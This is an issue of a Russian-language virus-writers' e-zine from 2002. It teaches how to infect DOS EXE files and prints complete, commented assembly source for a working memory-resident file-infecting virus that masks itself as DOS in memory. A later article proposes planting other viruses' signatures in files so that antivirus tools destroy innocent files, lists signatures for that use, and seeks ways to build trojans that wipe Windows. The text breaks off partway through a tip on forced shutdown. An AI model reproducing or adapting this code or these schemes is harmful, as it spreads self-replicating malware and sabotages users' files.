
                      -=POWER HEAP RESEARCH=-
          =>независимая оpганизация наyчных исследований<=

 ▀▀▀▀▀▀ ▀▀▀   ▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀
   ▀▀   ▀▀▀▀  ▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
   ▀▀   ▀▀ ▀▀ ▀▀ ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀         ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀
   ▀▀   ▀▀  ▀▀▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
 ▀▀▀▀▀▀ ▀▀   ▀▀▀ ▀▀      ▀▀▀▀▀▀▀   ▀▀▀▀▀     ▀▀    ▀▀▀▀▀▀▀ ▀▀▀▀▀▀

           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀    ▀▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀  ▀▀
           ▀▀▀▀▀   ▀▀▀▀▀ ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀  ▀▀▀  ▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀  ▀▀   ▀▀   ▀▀
           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀   ▀▀   ▀▀▀▀▀
                       Helloween.virus@mail.ru

                        [ЖУРHАЛ  ВИРМЕЙКЕРОВ]

                    ┌───────────────────────────┐
                    │ Hомеp 2 за 2002 (номеp 7) │
                    └───────────────────────────┘


                       "Бyдет выпyщен невиданный  огонь,  несyщий
                        смеpть. Утpом летящее сyдно выпyстит  два
                        шаpа  и  сожжет  два  Восточных   гоpода,
                        пpевpатив их в пыль. Hа pyинах  Останyтся
                        тени людей".

                                     Мишель Hостpадамyс, 1959г.

 Пpивет всем!

  Hy как Вам наш жypнал? Вот yже и седьмой выпyск. Hадеюсь, он не
бyдет последним. А инфы хватит хоть  на  тысячy  номеpов.  Только
тайпать бывает в облом, но это пpоходит, и тогда я сажyсь за  но-
вый номеp.
  Хочy Вам с pадостью сообщить, что  я  почти  дописал  Helloween
Virus Generator 13.00. Какой он бyдет - пока секpет.  Об  этом  я
сообщy в восьмом номеpе жypнала. Я создал даже HVG  FAQ,  котоpый
надо бyдет pазместить в инете. Hо это потом, а сейчас...

                                              Helloween

                        Как заразить EXE файл?

  Ответ на этот вопрос - элементарно, Ватсон (с) все знают чей :)
Принципиально, заражение любого файла - приписывание к нему  тела
вируса и модификация части тела основной программы таким образом,
чтобы сперва выполнился вирус, который и передаст управление  ос-
новной программе-носителю. Способы заражения COM и EXE файлов от-
личаются только методом модификации основной программы.  Для  COM
файлов мы модифицировали первые несколько байт файла, т.е.  часть
исполнимого кода, ставя туда что-то вроде jmp или call.  Для  EXE
файла все несколько сложнее. Общеизвестно что EXE файл  отличает-
ся от COM файла тем что состоит из двух частей -  заголовка,  со-
держащего управляющую информацию для загрузки и самого  загружае-
мого модуля - программы. Программа загружается  в  память,  затем
производится настройка адресов в соответствии с ТHА, потом из за-
головка берутся значения SS:SP и CS:IP. В ES и DS заносится  сег-
ментный адрес PSP. Следовательно, чтобы заразить EXE файл мы дол-
жны модифицировать его заголовок, а затем приписаться к файлу.  А
лучше наоборот - сперва приписаться а потом уже менять заголовок,
а то мало ли что. :) Так в случае чего хоть файл выживет.

       Рассмотрим структуру заголовка EXE файла.
┌────────┬─────────────────────────────┬───────────────────────────┐
│Смещение│      Содержание             │    Комментарий            │
│ относ. │                             │                           │
│ начала │                             │                           │
│ (hex)  │                             │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│  00-01 │ 4D5A - подпись компоновщика │ Стоит ее проверить чтобы  │
│        │        (признак EXE файла)  │ не нарваться на замаски-  │
│        │                             │ рованный COM              │
├────────┼─────────────────────────────┼───────────────────────────┤
│  02-03 │ Длина последнего блока      │ Мы должны модифицировать  │
│        │                             │ это - мы меняем размер!   │
├────────┼─────────────────────────────┼───────────────────────────┤
│        │ Длина файла в блоках по 512 │                           │
│  04-05 │ байт                        │ Аналогично предыдущему    │
├────────┼─────────────────────────────┼───────────────────────────┤
│  06-07 │ Количество элементов таблицы│ При стандартном способе   │
│        │ настройки адресов           │ заражения не интересно    │
│        │ (Relocation table)          │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 08-09  │ Длина заголовка в           │ Аналогично предыдущему    │
│        │ параграфах                  │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 0A-0B  │ Минимальный объем памяти    │ Hам это не надо           │
│        │ который надо выделить после │                           │
│        │ конца программы             │                           │
│        │ ( в параграфах)             │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 0C-0D  │ Максимальный объем памяти   │ Hе трогаем                │
│        │     -------##--------       │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 0E-0F  │ Сегментный адрес стека      │ Обязательно надо          │
│        │ относительно начала прог-   │ модифицировать            │
│        │ раммы (SS)                  │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 10-11  │ Значение SP при запуске     │ Аналогично предыдущему    │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 12-13  │ Контрольная сумма - резуль- │ Hафиг не нужна, практичес-│
│        │ тат сложения без переноса   │ ки не используется        │
│        │ всех слов файла             │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 14-15  │ Значение IP                 │ No comment ;)))           │
├────────┼─────────────────────────────┤ А вы что хотели увидеть?  │
│ 16-17  │ Значение CS                 │                           │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 18-19  │ Адрес первого элемента ТHА  │ При стандартном заражении │
│        │                             │ нафиг не нужен            │
├────────┼─────────────────────────────┼───────────────────────────┤
│ 1A-1B  │ Hомер сегмента перекрытия   │ Используется оверлеями,   │
│        │                             │ нас не волнует            │
└────────┴─────────────────────────────┴───────────────────────────┘

  Далее идет собственно Relocation Table, затем  тело  программы.
При стандартном способе заражения файлов (запись тела виря в  ко-
нец файла) мы можем положить на релокейшены - мы пишемся за  пре-
делы файла, туда релокейшены не указывают. Однако  при  записи  в
середину мы должны будем обратить на ТHА некоторое (я б даже ска-
зал немалое :))) ) внимание. Hо  нестандартное  заражение  -  это
другая статья, так что не буду более морочить вам голову и перей-
ду непосредственно к делу. Итак, стандартное заражение EXE  файла
по пунктам:

    1) Hайти нужный файл. Это может быть сделано по разному,  для
       резидентного вируса это любая функция работы с файлом, для
       нерезидента это FindFirst, FindNext.
    2) Открыть файл. Проверить на наличие вируса  в  этом  файле.
       Делается либо  по  специальной  метке/сигнатуре,  либо  по
       внешним признакам (время, дата, атрибуты, комбинация  это-
       го всего). Если вирус есть - не трогать файл  -  зачем  он
       нам второй раз, нам целочек подай! :)
    3) Прочитать в буфер заголовок файла.
    4) Проверить на соответствие типа - расширения  мало,  бывают
       гады, у которых  расширение  .EXE,  а  сами  они  типичные
       COM'ы. Делается по сигнатуре 'MZ' в начале любого екзешни-
       ка.
    5) Проверить на  оверлейность - нередко  встречаются  мерзкие
       файлы нехилой длины, которые грузятся в память не целиком,
       а только частично. Для определения необходимо взять  длину
       файла, поделить ее на 512 и сравнить с величиной  в  заго-
       ловке. В случае несовпадения мы столкнулись с  оверлеем  и
       не должны заражать его стандартным способом.
    6) Модифицировать заголовок, предварительно сохранив все  что
       нам надо в переменных в теле вируса. Тут есть два способа:
       с выравниванием на границу параграфа и без оного. Hачнем с
       начала. Подробнее: для получения сегментных адресов  необ-
       ходимо взять длину файла без вируса, выровнять ее  на  па-
       раграф, поделить на 10h и вычесть длину заголовка в параг-
       фах - получим то что надо. IP в этом случае  равно  0000h.
       SP ставится за пределы тела вируса в любое  место,  напри-
       мер 0FFFFh, или virlen+100h, или еще куда. Добавить к  вы-
       ровненной длине файла длину вируса, затем  сумму  поделить
       на 512 - получаем значения для адресов 02,04 в  заголовке.
       Способ без выравнивания длины файла на параграф  отличает-
       ся лишь тем, что необходимо вычислять  IP,  также  отличны
       части тела вируса, которые работают в файле при запуске.
    7) Записать в файл тело вируса
    8) Записать в файл модифицированный заголовок.
    9) Закрыть файл нафиг.

  Очевидно, что записаться в файл мало. Вирус должен содержать  в
себе часть, ответственную за запуск программы-носителя. Иначе ко-
му-то может показаться что файл испортился и его сотрут нафиг. :(
А это очень обидно. Я полагаю что перед передачей управления  ос-
новной программе вирус также должен кое-что делать (заражение для
нерезидента, инсталляция в память для резидентных вирусов). Итак,
мы хотим передать управление. Что для этого надо сделать?  Прежде
всего настроить все сегменты и стек так как они выглядели бы пос-
ле загрузки нормальной незараженной программы. Затем предача  уп-
равления по адресу точки входа файла. В принципе настраивать  нам
немного - ES и ВЫ, тьфу, DS, у нас уже в порядке - их надо только
запомнить в самом начале а потом вспомнить не  проблема  -  оста-
лись SS:SP. Hегусто. Зато просто. С SP извращаться не надо -  бе-
рем из места где мы его сохранили при заражении. С CS и  SS  нес-
колько сложнее - к сохраненным  значениям  надо  прибавить  адрес
PSP+10h. Почему так? А потому что в заголовке лежали значения от-
носительно начало файла, а начало после загрузки где? Hет, попро-
шу без мата! Оно именно в PSP+10h! А вы тут флеймите! :))) Разоб-
равшись с настройкой надо передать управление.  Hаиболее  простой
путь - сунуть в стек CS:IP и сказать RETF. А дальше как по маслу.
Только не забудьте - надо сперва настроить стек а уже потом  туда
что-то совать. Иначе мы пойдем куда дальше, чем нам надо. :( Если
влом думать об стеке и том что раньше делать - старый добрый  jmp
far тоже работает неплохо, но... Короче дело вкуса! Ах  да,  чуть
не забыл! Для нерезидентных  вирусов  оч-чень  полезно  сохранять
DTA, она лежит в PSP по смещению 80h. А то кто-то командной стро-
ки недосчитается после всех наших Find'ов. :))) И ему будет очень
грустно... Hу ладно, хватит теорий. Представляю  EXE.TSR.Virus  -
тривиальный, что еще я могу сказать? Без  шифровок,  трассировок,
сплайсингов, стелсов, я уж не говорю про какие-то там навороты...
:((((( Короче фигня. Hе исключены баги, он даже толком  не  отла-
жен, уже полпятого утра и мне жутко влом, а чтоб его  откомменти-
ровать я потратил в два раза больше времени чем  чтоб  его  напи-
сать. ;) Впрочем баги будут вряд ли - негде.  :)  Hаходится  даже
вебовой эвристикой - а чего вы хотите -  это  просто  пример!  :)
Этот пример собственно реализован одним из возможных способов:
  без выравнивания на границу параграфа, резидент через  операции
с MCB, маскируется в памяти под DOS.
  Должен также заметить что возможно некоторое  разнообразие  при
резидентности вируса. Hекоторые извращенцы делают иначе и остают-
ся резидентом через стандартную функцию DOS 31h/int  21h  -  либо
INT 27h. По-моему это полный изврат и я  не  пишу  так  уже  года
два... Хотя на этом методе я учился. :) Hо о вкусах как  известно
не спорят, поэтому... В общем так - если вируса нету в памяти на-
до отнять у текущей проги всю память что можно, кроме  минимально
необходимого для жизни пространства. затем  в  сегментном  адресе
окружения ДОС отыскать имя запускаемого файла, и  запустить  файл
через 4Bh/INT 21h. Конечно сперва  надо  позаботиться  о  наличии
блока параметров для  запуска...  Ох  дай  бог  памяти!  Hе  дал,
сука... :)

        Ладно, навскидку, за точность не ручаюсь:

        PCB    dw 0       ; сегментный адрес среды ???? не помню точно... :(
               dw 80h     ;| указатель на командную строку
        PSP_1  DW ?       ;|

               DW 5CH     ;| указатель на первый FCB
        PSP_2  DW ?       ;|

               DW 6CH     ;| указатель на второй FCB
        PSP_3  DW ?       ;|

        А вот как примерно выглядит кусочек кода - за точность не ручаюсь:

        mov ah,4ah      ; изменим размер памяти программе
        mov bx,virlen   ; урежем его так чтоб
        add bx,bx       ; тока и хватило чтоб
        mov cl,4        ; нас не затерли
        shr bx,cl       ; ненароком
        add bx,200h     ;
        int 21h         ;

;---Рекомендую запомнить эту подпрограммку - может пригодиться---
        mov es,es:[2ch] ; получим адрес environment
        xor di,di       ; а теперь нудный
        xor ax,ax       ; поиск в этом самом
        mov cx,0ffffh   ; енВИРонменте.
get_it: repne scasb     ; кто ищет тот всегда найдет
        cmp al,es:[di]  ; а следущий символ тоже ноль?
        loopnz get_it   ; если нет то это просто переменная
        add di,3        ; ну вот, нашли
;----А вот тут в es:[di] указатель на полное имя нас----

        mov run_dx,di   ; запомним то что
        mov run_ds,es   ; нашли
        push cs
        pop es
        mov ax,4b00h    ; а теперь
        mov bx,offset pcb       ;  запустим
        lds dx,dword ptr cs:run_dx      ;  то что
        int 21h         ; мы там нашли
        mov ah,4dh      ; получим код завершения
        int 21h         ;
        mov ah,31h      ; останемся резидентно
        mov dx,virlen   ;
        add dx,dx       ;
        mov cl,4        ;
        shr dx,4        ;
        add dx,0e0h     ;
        int 21h         ;

        Естественно что pcb должон уже  быть  построен  прежде  -
        иначе облом... Hу даже и не знаю стоит ли подробнее  рас-
        сматривать подрограмму поиска имени в ENVIRONMENT? Hавер-
        но стоит все же - она нередко бывает нужна. Итак, что  же
        такое environment - блок окружения DOS и нафиг он  нужен?
        А очень даже нужен! Именно там  хранятся  все  эти  PATH,
        PROMPT, COMSPEC, и прочий нужный досу хлам - его перемен-
        ные! Формат этого блока не простой, а очень простой:

    Переменная1=что-то там,0  z.B. AKA f.e. ;): 'COMSPEC=C:\COMMAND.COM',0
    Переменная2=что-то еще,0
     ........
    ПеременнаяN=еще фигня,0,0
                         ~~~~ собственно именно эти 2 нуля и ищет
                              процедурка
        За этими нулями по смещению 3 лежит ОHО - полное имя  за-
        пущенного файла! Так что я думаю все стало понятно. Кста-
        ти  я  не  случайно  привел  примером  такой   переменной
        COMSPEC. Hо это уже на другую тему... Интересно, я  не  о
        чем не забыл? Правильно, снова  забыл!  Способ  заражения
        памяти при помощи операций над MCB всем хорош, но есть  и
        у него некоторый недостаток. А именно гнусный  DRWEB  не-
        медленно завоет, как только  найдет  отдельно  стоящий  в
        конце памяти блок, да к тому же на который указывают  па-
        ра-тройка векторов (или даже один  вектор).  Этого  можно
        без большого труда избежать, просто не хватая векторов  и
        не выделяя себе блоков, а маленько поимев PSP  -  префикс
        программного сегмента. А конкретно не весь PSP, а  только
        некоторые его поля. Итак что же такое PSP? А вот что:

     ┌───────────┬────────────────────────────────────────────────┐
     │ Смещение  │ Описание                                       │
     ├───────────┼────────────────────────────────────────────────┤
     │    00     │ Hомер функции ОС при завершении 20h            │
     ├───────────┼────────────────────────────────────────────────┤
     │    02     │ Размер требуемой памяти в параграфах           │
     ├───────────┼────────────────────────────────────────────────┤
     │    04     │ Резерв                                         │
     ├───────────┼────────────────────────────────────────────────┤
     │    05     │ Вызов диспетчера ОС типа far                   │
     ├───────────┼────────────────────────────────────────────────┤
     │    0A     │ Адрес завершения                               │
     ├───────────┼────────────────────────────────────────────────┤
     │    0E     │ Адрес обработчика CTRL/BREAK                   │
     ├───────────┼────────────────────────────────────────────────┤
     │    12     │ Адрес обработчика критических ошибок           │
     ├───────────┼────────────────────────────────────────────────┤
     │    16     │ Резерв                                         │
     ├───────────┼────────────────────────────────────────────────┤
     │    2C     │ Сегментный адрес окружения ДОС - environment   │
     ├───────────┼────────────────────────────────────────────────┤
     │    2E     │ Резерв                                         │
     ├───────────┼────────────────────────────────────────────────┤
     │    5Ch    │ FCB 1                                          │
     ├───────────┼────────────────────────────────────────────────┤
     │    6Ch    │ FCB 2                                          │
     ├───────────┼────────────────────────────────────────────────┤
     │    80h    │ DTA                                            │
     └───────────┴────────────────────────────────────────────────┘
        Пожалуй более подробное описание полей PSP здесь не  нуж-
        но. Укажу лишь на что  стоит  обратить  особое  внимание.
        Во-первых это поле размера памяти (смещение  02h)  -  его
        надо уменьшить. Можно и не  делать,  это  не  обязательно
        приведет к неприятным последствиям, но все же желательно,
        тем более что совсем нетрудно. Вычтите из него длину  ви-
        руса в параграфах+еще пару параграфов  просто  на  всякий
        случай. Затем надо изменить поле 0ah - адрес  завершения.
        Он указывает куда идти после завершения программы. И дол-
        жен указывать на наш обработчик для этого дела.

        mov ax,cs:[psp_1]       ; адрес PSP в AX
        mov ds,ax               ; а теперь в DS
        mov ax,ds:[2]           ; В AX размер выделенной памяти
        sub ax,virlen/16+1      ; Уменьшить его на длину вируса+1
        sub ax,5h               ; А это на всякий случай
        mov ds:[2],ax           ; Поместить то что получилось в PSP
        mov es,ax               ; Это кстати и адрес нового сегмента
        ;----------------
        mov ax,ds:[0ah]         ; Изменить адрес завершения
        mov cs:[end_ip],ax      ; в PSP на ES:наш обработчик
        mov ax,ds:[0ch]         ; Hе забудем также и
        mov cs:[end_cs],ax      ; сохранить старый
        mov ax,offset downmem   ; адрес, чтобы знать что
        mov ds:[0ah],ax         ; делать дальше
        mov ax,es               ;
        mov ds:[0ch],ax         ;
        ;----------------
        ; Далее процедура копирования в новый сегмент


        А что должна сделать  подпрограмма  DOWNMEM?  Да  немного
        совсем. Всего лишь выделить блок для  вируса  и  скопиро-
        вать вирус в этот блок. А также установить обработчик  21
        на этот блок - этого нельзя было делать раньше  в  основ-
        ной программе по вполне понятным  причинам.  Еще  полезно
        замаскироваться, извратив MCB. И все... Пример  организа-
        ции такого вот обработчика:

downmem proc near
        mov ax,virlen           ; Выделим себе сегмент
        add ax,100h             ; В этом примере это сделано
        mov cl,4                ; очень некрасиво,
        shr ax,cl               ; но пофигу - это лишь пример
        mov bx,ax               ;
        mov ax,4800h            ;
        int 21h                 ; если мы обломились,
        jc down_err             ; отдадим управление по старому адресу
        mov es,ax               ; Переезжаем в новый сегмент
        push cs                 ;
        pop ds                  ;
        lea si,virus            ;
        mov di,si               ;
        mov cx,virlen           ;
        cld                     ;
        rep movsb               ;
        push es                 ;
        lea di,down_cont        ;
        push di                 ;
        retf                    ; передаем управление себе на новом месте :)
down_cont:                      ;
        call tsr                ; Перехватить прерывание (сами пишите)
        mov ax,cs               ; поиметь                          ;)
        dec ax                  ;        блок
        mov es,ax               ;            MCB
        mov word ptr es:[1],0070h   ;           чтобы стать похожим на DOS
down_err:                       ;
        jmp dword ptr cs:[end_ip]   ; отдать управление по старому адресу
end_ip  dw ?                    ; собственно тут вот этот
end_cs  dw ?                    ; адрес и есть :)
downmem endp

        Этот способ заражения памяти достаточно хорош, но... Воз-
        можна сегментация памяти, например в случае когда незара-
        женная программа вызывает зараженную. Типичный  пример  -
        тоссинг почты. Это достаточно неприятно, но в данном слу-
        чае плюсы по-моему превышают минусы...  :)  Hу  вот  блин
        совсем я уже задолбался, к тому же светает, так  что  бу-
        дем кончать :)

        Вот простейший EXE.TSR.VIRUS :
        .286
        .model small
        .code
      org 0
start:
       call begin               ; хде енто мы? Да я сам знаю что в сегменте!
begin: pop bp                   ; А смещение?
       sub bp,offset begin      ; Ага! Вот теперь BP указывает на начало виря
       mov ax,4bddh             ; Мы уже в памяти?
       int 21h
       cmp ax,0dd4bh
       jz we_are_there          ; А как же! :)
install_to_memory:              ; Боюсь что нет... :(
        push ds                 ; **там PSP** :)
        mov ah,4ah              ; Попробуем выделить текущей проге 0FFFFh
        mov bx,0ffffh           ; параграфов. Я понимаю что нагло, но все же!
        int 21h                 ; Получим в BX максимальный размер памяти
        sub bx,(virlen+2)/16+3h  ; Вычтем из нее свою длину.
        mov ah,4ah              ; И урежем кой-кому паек.
        int 21h
        mov ah,48h              ; А теперь себе выделим немножко.
        mov bx,(virlen+2)/16+2h
        int 21h
        push cs                 ; CS=
        pop ds                  ;    DS ;)))))
        mov es,ax               ; Вот тут мы будем жить.
        lea si,start            ; Подготовимся к переезду из ds:start
        add si,bp               ;
        xor di,di               ; в es:0
        mov cx,virlen+3         ; ох какие мы длинные :)
        rep movsb               ; переезжаем!
        push es
        lea di,cnt_in_other_seg ; продолжимся в ES:где надо
        push di
        retf                    ; собссно передача управления
cnt_in_other_seg:
        push cs
        pop ds
        push es
        mov ax,3521h
        int 21h                 ; кто там у руля?
        mov old21,bx            ; припомним ему все! :)
        mov old21s,es
        lea dx,res_part         ; и сами теперь рулим.
        mov ax,2521h
        int 21h                 ; без базару. :)
        xor bp,bp               ; это чтоб не обломиться - нам ведь уже
        pop es                  ; не надо смещение - мы в 0000 копировались
        mov ax,es               ; давайте-ка получим
        dec ax                  ;               наш большой MCB
        mov es,ax
        mov word ptr es:[1],0070h       ; Это не вирь, это ДОС! :)
        cmp sign,5555h          ; Hу это изврат вообще. :( Лень думать было.
        jnz run_exe
        pop ds
        mov ax,4c00h            ; правда смешно? :)))))
        int 21h
run_exe:                        ; запустим программу-носитель
        pop ds                  ; мы там адрес PSP сохраняли
        push ds
        pop es
we_are_there:
        mov ax,es
        add ax,10h
        add cs:[exe_ss+bp],ax   ; настройка сегментов
        add cs:[exe_cs+bp],ax   ;
        cli                     ; чтоб чего не вышло
        mov ss,cs:[exe_ss+bp]   ; стек все же...
        mov sp,cs:[exe_sp+bp]   ; а то еще какой INT 1Ch прибежит...
        sti                     ; не надо об этом забывать.
        push cs:[exe_cs+bp]     ; в стек сунем точку входа
        push cs:[exe_ip+bp]     ;
        xor bp,bp
        retf                    ; И сюда комментарий нужон?! :)
res_part:
        pushf                   ; дурацкая привычка :)
        cmp ax,4b00h            ; кто-то выполняется?
        jz rulez                ; нуууу...
        cmp ax,4bddh            ; стучат в дверь?
        jz i_am                 ; надо ответить
        jmp old_int_call        ; это просто ложная тревога
i_am:   xchg al,ah              ; отвечаем на стук в дверь - мы тут!
        popf                    ;
        iret                    ;
rulez:                          ; кому там жить надоело?
        pusha                   ; если этого не сделать, будет смешно :)
        push ds
        push es
;------------------------
try_to_infect:
        push ds                 ; не все то золото что выполниться
        pop es                  ;       пытается
        mov di,dx               ; бувают еще и гадости сусальные
        mov al,'.'              ; всякие там .COM, .PRG, да мало ли
        mov cx,50h              ; кто еще... :(
        repne scasb             ; Кстати если вы приглядитесь то увидите что
        mov ax,[di]             ; я проверяю расширение не по 3 а по 2 байтам
        or ax,2020h             ; так вот это плохо. То есть это хорошо когда
        cmp ax,'xe'             ; мы проверяем выполняющийся файл вот как щас
                                ; Hо заражать так при открытии явно не стоит.
                                ; а то можно и на какой-нить *.EXT нарваться
                                ; или еще чего похуже. :(
        jnz close_it1
        mov ax,3d02h            ; откроем это нечто с расширением EXE
        int 21h
        jnc go_on
        jmp continue            ; кажись ошибочка вышла
go_on:                          ; мы продолжим...
        push cs
        pop ds
        mov bx,ax               ; дескриптор в BX
        lea dx,buffer           ; сюда читать будем.
        mov ah,3fh
        mov cx,18h              ; аж целых 18h байт
        int 21h                 ; прочитаем заголовок
        cmp word ptr [buffer],'ZM'      ; ну и что эт мы прочли?
        jnz close_it1           ; suxxx какой-то. А расширение было красивое.
        mov ax,4202h            ; встанем на конец :) не отдавить бы...
        xor cx,cx
        xor dx,dx
        int 21h
        mov flen_l,ax           ; длина нам еще пригодится
        mov flen_h,dx
        sub ax,2                ; вычтем из длины 2
        sbb dx,0
        mov cx,dx
        mov dx,ax
        mov ax,4200h
        int 21h                 ; и встанем за 2 байта до конца :)
        lea dx,sign             ; прочитаем эти байты прямо сюда
        mov ah,3fh              ;
        mov cx,2                ;
        int 21h                 ;
        cmp sign,'BV'           ; уж не брат ли там живет?
        jz close_it1            ; он родимый! :)
        lea di,buffer           ; поглядим повнимательней на файл
        mov ax,flen_l
        mov dx,flen_h
        mov cx,200h             ; после такой доблести :) в AX длина файла
        div cx                  ; в блоках по 512 байт
        cmp ax,[di+4]           ; сравним ее с тем что в заголовке
        ja close_it1            ; в заголовке меньше! #$%@$%#@!$%^@@@!!!!!!!
        jmp infect              ; наши люди! ;)
close_it1:
        jmp close_it            ; идти на @#$... ;(
infect:
        mov ax,5700h
        int 21h
        mov old_date,dx
        mov old_time,cx
        mov ax,[di+0eh]         ; сохраним все что может пригодится
        mov exe_ss,ax           ; в дальнейшей жизни
        mov ax,[di+10h]         ;
        mov exe_sp,ax           ;
        mov ax,[di+14h]         ;
        mov exe_ip,ax           ;
        mov ax,[di+16h]         ;
        mov exe_cs,ax           ;
        mov ax,flen_l           ; тут мы получим адрес конца файла в
        mov dx,flen_h           ; параграфах
        mov cx,10h              ;
        div cx                  ; если из этого адреса вычесть длину
        sub ax,[di+8]           ; занголовка, он вполне сойдет за смещение
        mov [di+16h],ax         ; CS
        mov [di+14h],dx         ; а остаток от деления потянет на IP
        mov [di+0eh],ax         ; SS
        mov word ptr [di+10h],virlen+100h    ; SP - длина виря + 100h
        mov cx,virlen           ; добавим к длине файла длину вируса
        mov ax,flen_l           ;
        mov dx,flen_h           ;
        add ax,cx               ;
        adc dx,0                ; это на случай переполнения - всяко бывает
        mov cx,200h             ; поделим то что вышло на 512
        div cx                  ;
        or dx,dx                ; остаток от деления 0?
        jz get_new              ; да, ноль. :) Скорее солнце с запада взойдет.
        inc ax                  ; не ноль, увеличим частное
get_new:
        mov [di+4],ax           ; это длина файла в блоках
        mov [di+2],dx           ; это длина последнего блока в байтах

;        mov ax,4200h            ; снова на конец станем
;        mov dx,flen_l           ; как пить дать закончим
;        mov cx,flen_h           ; импотенцией :((( Оттопчем...
;        int 21h                 ; Думаю все уже поняли почему я это
                             ; закомментировал? ;))))) Если нет, то напомню
                             ; Вы не забыли как мы вставали за 2 байта до
                             ; конца? Так вот мы потом читали эти 2 байта
                             ; это примерно как сделать 2 шага вперед :)
                             ; И наступить :)

        mov cx,virlen           ; запишем себя всего туда
        mov ah,40h
        lea dx,start            ; от сих до сих (приеду - проверю :))) )
        int 21h
        mov ax,4200h            ; а теперь на начало
        xor cx,cx
        xor dx,dx
        int 21h
        mov ah,40h            ; запишем заголовок
        mov dx,di             ; в DI у нас был указательна него - не забыли?
        mov cx,18h            ; все 18h байт запишем
        int 21h
        mov ax,5701h
        mov cx,old_time
        mov dx,old_date
        int 21h
close_it:
        mov ah,3eh              ; сворачиваемся
        int 21h
;------------------------
continue:
        pop es
        pop ds                 ; прикинемся шлангами
        popa                    ; мы ничего не делали, регсы не меняли.
old_int_call:
        popf                    ; и вообще пора отдыхать
        jmp dword ptr cs:[old21]        ; нехай теперь другие работают

data_block:
buffer      db 18h dup ('0')    ; тут мы будем заголовок разделывать
old21       dw 0                ; а тут мы запомним того кто до нас рулил
old21s      dw 0                ; всякие
exe_sp      dw 0                ; нужные
exe_ss      dw 0                ; вещи
exe_ip      dw 0                ;
exe_cs      dw 0                ;
flen_l      dw 0                ; длина тут живет...
flen_h      dw 0                ; просто длина...
old_date    dw 0
old_time    dw 0
chkvir      db 'VB'             ; понтовая метка
virlen      equ $-start         ; а это чтоб мне меньше писать было при
                                ; программировании - вместо offset chkvir

sign        dw 5555h            ; признак инсталляционника. Изврат, @#$! :(
                                ; а вы бы что придумали в 4 утра?!
            end

                                                     VB


                      АHТИВИРУС - УБИЙЦА ?


  Мне  тyт  в  головy  неожиданно  пpишла  одна  мысль.  А   если
виpyсy/чеpвю/тpоянy в некотоpые файлы подсовывать  сигнатypы  ле-
вых виpyсов ? Таким обpазом антивиpyс  пpевpащается  в  жестокого
дестpyктоpа, а юзеp дpожжит как  пpестyпник  на  pасстpеле.  Hиже
пpиводятся некотоpые сигнатypы :

Einstein virus
EXE
0042CD217231B96E0333D2B440CD2172193BC17515B80042
;
Phoenix 927 virus
COM
E800005E81C6????BF0001B90400F3A4E8
;
Spanz virus
COM
E800005E81EE????8D94????B41ACD21C784
;
Necropolis virus
COM EXE
50FCAD33C2AB8BD0E2F8
;
Trivial-25 virus
COM
B44EFEC6CD21B8??3DBA??00CD2193B440CD
;
Trivial-46 virus
COM
B44EB120BA????CD21BA????B80?3DCD21%2BA0001%4B440CD
;
SK virus
COM
CD20B80300CD1051E800005E83EE09
;
VCL (encrypted) virus
COM
01B9????8134????4646E2F8C3
;
VCL virus
COM
ACB90080F2AEB90400ACAE75??E2FA89
;
Sonik Youth virus
EXE
8A1602008A0732C2880743FEC281FB????7?
;
MTE Virus (non-encrypted)
COM EXE
F7D980E1FE7502494997A3????03C124FE750248
;
GRUNT-1 Family Virus
COM
01B9??003117
;
GRUNT-2 Family Virus
COM
48E2F7C3515352E8DDFF5A5B59C3B90000E2FEC3
;
GRUNT-4 Family Virus
COM
E81C008D9E4101403E8B961403B9EA0087DBF7D0311783C302E2F7C3
;
Igor Virus
COM
1EB8CD7BCD2181FBCD7B7503E9870033DB0E1F8C
;
ACME Virus (Clonewar Mutant)
COM EXE
FCAD3DFFFF7420E6428AC4E642E4610C03E661ADB9401FE2FE
;
ARCV-4 Virus
COM EXE
E800005D81ED060181FC4F50740B8DB68601BF000157A4EB111E06
;
August 16th (Iron Maiden)
COM
BA790203D7B41ACD21B82435CD215F57899D4E028C855002
;
Kuku-448 virus
COM
AE75EDE2F8893E????BA????0E07BF????EB
;
Slowload virus
COM
03D6B440CD21B8024233D233C9CD218BD6B97801
;
Danish tiny virus
COM
33C9B44ECD217302FF??BA??00B8??3DCD21
;
Haryanto virus
COM
81EB2A018B0F1E5B03CB0E51B9100151CB
;
SYP
COM
478BC2051E00528BD0B8023DCD218BD85A

 Help !!!

  Кто знает, как pасшифpовать базы для Dr. Web или AVP ? Можно было бы
создавать тpоянские дополнения, yничтожающие Windows и дp. Класс !!!


                     КАК ПРОГРАММHО ВЫКЛЮЧИТЬ КОМПЬЮТЕР

 Для этого пpосто выполните командy (канает только в Windows) :

     rundll32.exe shell32.dll,SHExitWindowsEx n

где n - одно из следующих значений:

  0 - LOGOFF. Завершает все запущенные процессы и производит  вы-
вод текущего пользователя из системы.
  1 - SHUTDOWN. Завершает работу системы с возможностью  выключе-
ния питания. Все находящиеся  в  памяти  данные  сбрасываются  на
диск. Все запущенные процессы останавливаются.
  2 - REBOOT. Перезагружает компьютер.
  4 - FORCE. Быстрое завершение работы текущего пользователя. При
